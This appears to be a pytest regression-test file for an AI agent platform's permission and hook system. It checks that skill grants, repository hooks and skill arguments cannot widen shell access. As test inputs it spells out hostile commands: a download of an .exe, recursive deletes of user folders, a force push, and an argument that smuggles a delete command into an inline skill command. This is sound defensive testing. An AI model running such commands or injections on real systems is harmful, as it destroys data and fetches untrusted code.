"""W5 review fixes (part 1): regression tests for the findings in docs/superpowers/reviews/2026-10-19-w5-review.md."""
from __future__ import annotations

import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from agentos.agentic.agent_tools import AgentToolset
from agentos.agentic.lifecycle import HookEvent, LifecycleBus
from agentos.agentic.session import TurnSession
from agentos.agentic.workspace import ConversationWorkspace
from agentos.configuration.capabilities import InstanceCapabilities
from agentos.configuration.mode import RuntimeMode
from agentos.permissions.engine import PermissionEngine
from agentos.permissions.trust import WorkspaceTrustStore
from agentos.settings import load_effective_settings
from agentos.settings.paths import orin_managed_dir, orin_user_dir
from agentos.skills.disk import load_disk_skills
from tests.unit.agentic.test_disk_skills_session import _Agents, _Store


def _project_skill(tmp_path: Path, allowed: str) -> tuple[Path, AgentToolset]:
    root = tmp_path / "w"
    folder = root / ".claude" / "skills" / "wide"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_bytes(f"---\ndescription: Wide\nallowed-tools: {allowed}\n---\nx".encode("utf-8"))
    toolset = AgentToolset(ConversationWorkspace.at_root(root), public_tool_names=True)
    toolset._disk_skills = load_disk_skills(workspace_root=root, trusted=True)
    assert toolset.invoke("Skill", {"skill": "wide"}).status == "succeeded"
    return root, toolset


# W5-R2: a repository's skill may pre-approve scoped shell commands, never every command.


def test_w5_r2_a_project_skill_drops_wildcard_shell_grants(tmp_path: Path) -> None:
    root, toolset = _project_skill(tmp_path, '["Bash(:*)", "Bash(**)", "PowerShell(:*)", "*(:*)", "Bash(git status:*)", "Read"]')
    grants = toolset.skill_grants()
    assert {rule.raw for rule in grants} == {"Bash(git status:*)", "Read"}
    engine = PermissionEngine(root, load_effective_settings(root, trusted=True), shell="cmd", home=tmp_path / "home")
    for command in ("curl https://example.invalid/x -o x.exe", r"del /s /q C:\Users\someone\Documents", "git push --force"):
        assert engine.decide("run_command", {"command": command}, "ask_permissions", extra_allow=grants).behavior == "ask", command
    assert engine.decide("run_command", {"command": "git status"}, "ask_permissions", extra_allow=grants).behavior == "allow"
    assert engine.decide("powershell", {"command": r"Remove-Item -Recurse C:\temp\x"}, "ask_permissions", extra_allow=grants).behavior == "ask"


def test_w5_r2_a_project_skill_drops_a_shell_or_wrapper_grant_that_runs_any_command(tmp_path: Path) -> None:
    _, toolset = _project_skill(tmp_path, '["Bash(env:*)", "Bash(sh:*)", "Bash(/usr/bin/env:*)", "Bash(cmd.exe:*)", "Bash(git:*)"]')
    assert {rule.raw for rule in toolset.skill_grants()} == {"Bash(git:*)"}


# W5-R4: an instance that may not start host processes runs only the operator's hooks (managed and user layers).


def _session_for(tmp_path: Path, mode: RuntimeMode) -> TurnSession:
    caps = InstanceCapabilities.for_mode(mode)
    return TurnSession(
        turn={
            "turn_id": "turn-1", "conversation_id": "conv-s", "user_id": "profile-b", "execution_id": "exe-1",
            "user_message_id": "um-1", "code_mode": "code", "provider": "openrouter", "model_id": "m",
        },
        store=_Store("hi"), agents_store=_Agents(), memory_store=None, provider_factory=lambda: None,
        workspace_root=tmp_path / "w", cancelled=lambda _turn: False,
        enable_terminal=caps.shell, host_folders=caps.host_folders, plugin_hooks=caps.plugin_hooks,
    )


def _marker_command(marker: Path) -> str:
    return f'"{sys.executable}" -c "open(r\'{marker}\', \'w\').write(\'ran\')"'


def _loopback_endpoint():
    seen: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):  # noqa: N802
            seen.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"{}")

        def log_message(self, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, seen, f"http://127.0.0.1:{server.server_address[1]}/hook"


def _fire_pre_tool_use(session: TurnSession):
    session.lifecycle = LifecycleBus()
    runtime = session.build_runtime()
    session.lifecycle.emit(HookEvent.PRE_TOOL_USE, tool_name="Read", tool_input={"file_path": "x"})
    return runtime


def _project_skill_with_hooks(root: Path, hooks: dict) -> None:
    folder = root / ".claude" / "skills" / "helper"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text(f"---\ndescription: Helper\nhooks: {json.dumps(hooks)}\n---\nHelp.", encoding="utf-8")


def test_w5_r4_a_repository_skill_hook_runs_nowhere_on_a_server(tmp_path: Path) -> None:
    session = _session_for(tmp_path, RuntimeMode.SERVER)
    marker = tmp_path / "skill-hook.txt"
    _project_skill_with_hooks(session.workspace.root, {"PreToolUse": [{"hooks": [{"type": "command", "command": _marker_command(marker)}]}]})
    WorkspaceTrustStore().trust("profile-b", session.workspace.root)
    session.lifecycle = LifecycleBus()
    runtime = session.build_runtime()
    assert runtime.toolset.invoke("Skill", {"skill": "helper"}).status == "succeeded"
    session.lifecycle.emit(HookEvent.PRE_TOOL_USE, tool_name="Read", tool_input={"file_path": "x"})
    assert not marker.exists()


def test_w5_r4_a_repository_settings_hook_runs_nowhere_on_a_server(tmp_path: Path) -> None:
    session = _session_for(tmp_path, RuntimeMode.SERVER)
    marker = tmp_path / "settings-hook.txt"
    (session.workspace.root / ".claude").mkdir(parents=True)
    (session.workspace.root / ".claude" / "settings.json").write_text(json.dumps({"hooks": {
        "PreToolUse": [{"hooks": [{"type": "command", "command": _marker_command(marker)}]}],
    }}), encoding="utf-8")
    WorkspaceTrustStore().trust("profile-b", session.workspace.root)
    _fire_pre_tool_use(session)
    assert not marker.exists()


def test_w5_r4_a_skill_http_hook_does_not_post_on_a_server(tmp_path: Path) -> None:
    server, seen, url = _loopback_endpoint()
    try:
        session = _session_for(tmp_path, RuntimeMode.SERVER)
        _project_skill_with_hooks(session.workspace.root, {"PreToolUse": [{"hooks": [{"type": "http", "url": url}]}]})
        WorkspaceTrustStore().trust("profile-b", session.workspace.root)
        session.lifecycle = LifecycleBus()
        runtime = session.build_runtime()
        runtime.toolset.invoke("Skill", {"skill": "helper"})
        session.lifecycle.emit(HookEvent.PRE_TOOL_USE, tool_name="Read", tool_input={"file_path": "x"})
    finally:
        server.shutdown()
    assert seen == []


def test_w5_r4_an_operator_http_hook_to_loopback_is_refused_on_a_server(tmp_path: Path) -> None:
    server, seen, url = _loopback_endpoint()
    try:
        orin_user_dir().mkdir(parents=True, exist_ok=True)
        (orin_user_dir() / "settings.json").write_text(json.dumps({"hooks": {"PreToolUse": [{"hooks": [{"type": "http", "url": url}]}]}}), encoding="utf-8")
        _fire_pre_tool_use(_session_for(tmp_path, RuntimeMode.SERVER))
    finally:
        server.shutdown()
    assert seen == []


def test_w5_r4_an_operator_command_hook_still_runs_on_a_server(tmp_path: Path) -> None:
    marker = tmp_path / "operator-hook.txt"
    orin_user_dir().mkdir(parents=True, exist_ok=True)
    (orin_user_dir() / "settings.json").write_text(json.dumps({"hooks": {
        "PreToolUse": [{"hooks": [{"type": "command", "command": _marker_command(marker)}]}],
    }}), encoding="utf-8")
    _fire_pre_tool_use(_session_for(tmp_path, RuntimeMode.SERVER))
    assert marker.exists()


def test_w5_r4_a_managed_http_hook_is_unchanged_on_a_server(tmp_path: Path) -> None:
    server, seen, url = _loopback_endpoint()
    try:
        orin_managed_dir().mkdir(parents=True, exist_ok=True)
        (orin_managed_dir() / "managed-settings.json").write_text(json.dumps({"hooks": {"PreToolUse": [{"hooks": [{"type": "http", "url": url}]}]}}), encoding="utf-8")
        _fire_pre_tool_use(_session_for(tmp_path, RuntimeMode.SERVER))
    finally:
        server.shutdown()
    assert len(seen) == 1


def test_w5_r4_the_desktop_still_runs_a_repository_skill_hook(tmp_path: Path) -> None:
    session = _session_for(tmp_path, RuntimeMode.LOCAL)
    marker = tmp_path / "skill-hook.txt"
    _project_skill_with_hooks(session.workspace.root, {"PreToolUse": [{"hooks": [{"type": "command", "command": _marker_command(marker)}]}]})
    WorkspaceTrustStore().trust("profile-b", session.workspace.root)
    session.lifecycle = LifecycleBus()
    runtime = session.build_runtime()
    runtime.toolset.invoke("Skill", {"skill": "helper"})
    session.lifecycle.emit(HookEvent.PRE_TOOL_USE, tool_name="Read", tool_input={"file_path": "x"})
    assert marker.exists()


# W5-R5: an instance that may not start host processes reads only the managed and trusted-project skills, commands,
# agents and output styles; the server account's own folders (and its plugins' folders) are not read.


def _write_skill(folder: Path, name: str) -> None:
    (folder / name).mkdir(parents=True, exist_ok=True)
    (folder / name / "SKILL.md").write_text(f"---\ndescription: {name}\n---\nx", encoding="utf-8")


def test_w5_r5_a_server_profile_sees_neither_the_server_accounts_skill_nor_its_agent(tmp_path: Path) -> None:
    _write_skill(orin_user_dir() / "skills", "admin-notes")
    (orin_user_dir() / "agents").mkdir(parents=True)
    (orin_user_dir() / "agents" / "admin-helper.md").write_text("---\nname: admin-helper\ndescription: d\n---\nx", encoding="utf-8")
    session = _session_for(tmp_path, RuntimeMode.SERVER)
    runtime = session.build_runtime()
    assert runtime.toolset.disk_skill("admin-notes") is None
    assert session._agent_definitions.get("admin-helper") is None


def test_w5_r5_a_server_profile_still_sees_managed_and_trusted_project_skills_and_agents(tmp_path: Path) -> None:
    _write_skill(orin_managed_dir() / "skills", "corp-notes")
    session = _session_for(tmp_path, RuntimeMode.SERVER)
    _write_skill(session.workspace.root / ".claude" / "skills", "repo-notes")
    (session.workspace.root / ".claude" / "agents").mkdir(parents=True)
    (session.workspace.root / ".claude" / "agents" / "repo-helper.md").write_text("---\nname: repo-helper\ndescription: d\n---\nx", encoding="utf-8")
    WorkspaceTrustStore().trust("profile-b", session.workspace.root)
    runtime = session.build_runtime()
    assert runtime.toolset.disk_skill("corp-notes") is not None
    assert runtime.toolset.disk_skill("repo-notes") is not None
    assert session._agent_definitions.get("repo-helper") is not None


def test_w5_r5_the_desktop_still_reads_the_persons_skills_and_agents(tmp_path: Path) -> None:
    _write_skill(orin_user_dir() / "skills", "my-notes")
    (orin_user_dir() / "agents").mkdir(parents=True)
    (orin_user_dir() / "agents" / "my-helper.md").write_text("---\nname: my-helper\ndescription: d\n---\nx", encoding="utf-8")
    session = _session_for(tmp_path, RuntimeMode.LOCAL)
    runtime = session.build_runtime()
    assert runtime.toolset.disk_skill("my-notes") is not None
    assert session._agent_definitions.get("my-helper") is not None


def test_w5_r5_output_styles_of_the_person_are_not_read_on_a_server(tmp_path: Path) -> None:
    from agentos.agentic.output_styles import load_output_styles

    (orin_user_dir() / "output-styles").mkdir(parents=True)
    (orin_user_dir() / "output-styles" / "mine.md").write_text("---\ndescription: mine\n---\nBe brief.", encoding="utf-8")
    (tmp_path / "w" / ".claude" / "output-styles").mkdir(parents=True)
    (tmp_path / "w" / ".claude" / "output-styles" / "repo.md").write_text("---\ndescription: repo\n---\nBe formal.", encoding="utf-8")
    assert "mine" not in load_output_styles(tmp_path / "w", trusted=True, personal=False)
    assert "repo" in load_output_styles(tmp_path / "w", trusted=True, personal=False)
    assert "mine" in load_output_styles(tmp_path / "w", trusted=True)


# W5-R7: an argument can never add an inline command to a skill; it is one word inside a command, plain text elsewhere.


def _asking_toolset(tmp_path: Path, asked: list) -> AgentToolset:
    toolset = AgentToolset(ConversationWorkspace(tmp_path / "w", "c1"), public_tool_names=True, conversation_id="c1",
                           code_mode_active=True, permission_mode="ask_permissions")
    toolset._disk_skills = load_disk_skills(workspace_root=None, trusted=False)
    toolset._interactive_permissions = True

    def request_and_wait(**kwargs):
        asked.append(kwargs["arguments"].get("command"))
        return {"decision": "deny"}  # the person is asked and says no: nothing runs

    toolset._permission_broker.request_and_wait = request_and_wait
    return toolset


def test_w5_r7_arguments_cannot_add_an_inline_command(tmp_path: Path) -> None:
    folder = orin_user_dir() / "skills" / "say"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text("---\ndescription: Say\n---\nEcho: !`echo $ARGUMENTS`", encoding="utf-8")
    asked: list = []
    _asking_toolset(tmp_path, asked).invoke("Skill", {"skill": "say", "args": "hi` and !`del /q important.txt"})
    assert len(asked) == 1 and asked[0].startswith("echo ")
    assert not any(command and command.startswith("del") for command in asked)


def test_w5_r7_a_backtick_in_an_argument_stays_text(tmp_path: Path) -> None:
    folder = orin_user_dir() / "skills" / "note"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text("---\ndescription: Note\n---\nYou said $ARGUMENTS. !`echo ok`", encoding="utf-8")
    asked: list = []
    outcome = _asking_toolset(tmp_path, asked).invoke("Skill", {"skill": "note", "args": "a`b"})
    assert len(asked) == 1 and asked[0].startswith("echo ")
    assert "You said a\\`b." in outcome.content


def test_w5_r7_a_shell_word_keeps_its_argument_as_one_word() -> None:
    import shlex

    from agentos.skills.disk import UnsafeCommandArgument, shell_word

    value = "hi` and !`del /q important.txt"
    if sys.platform == "win32":
        assert shell_word("a b") == '"a b"'
        with pytest.raises(UnsafeCommandArgument):  # cmd.exe cannot keep a double quote inside double quotes
            shell_word('x "y" & del z')
    else:
        assert shlex.split(shell_word(value)) == [value]


# W5-R8: a skill's allowed-tools cover its own inline commands from the first use, and still never beat a deny.


def test_w5_r8_a_skills_own_inline_command_runs_without_asking_on_its_first_use(tmp_path: Path) -> None:
    folder = orin_user_dir() / "skills" / "ctx"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text(
        "---\ndescription: Context\nallowed-tools: Bash(git --version:*)\n---\nThe answer is !`git --version`.", encoding="utf-8",
    )
    asked: list = []
    toolset = _asking_toolset(tmp_path, asked)
    first = toolset.invoke("Skill", {"skill": "ctx"})
    assert first.status == "succeeded" and asked == []
    assert [rule.raw for rule in toolset.skill_grants()] == ["Bash(git --version:*)"]


def test_w5_r8_a_deny_still_wins_over_the_skills_grant_on_its_first_use(tmp_path: Path) -> None:
    folder = orin_user_dir() / "skills" / "ctx"
    folder.mkdir(parents=True)
    (folder / "SKILL.md").write_text(
        "---\ndescription: Context\nallowed-tools: Bash(git --version:*)\n---\nThe answer is !`git --version`.", encoding="utf-8",
    )
    (orin_user_dir() / "settings.json").write_text(json.dumps({"permissions": {"deny": ["Bash(git --version:*)"]}}), encoding="utf-8")
    asked: list = []
    content = _asking_toolset(tmp_path, asked).invoke("Skill", {"skill": "ctx"}).content
    assert asked == [] and "[command not run:" in content


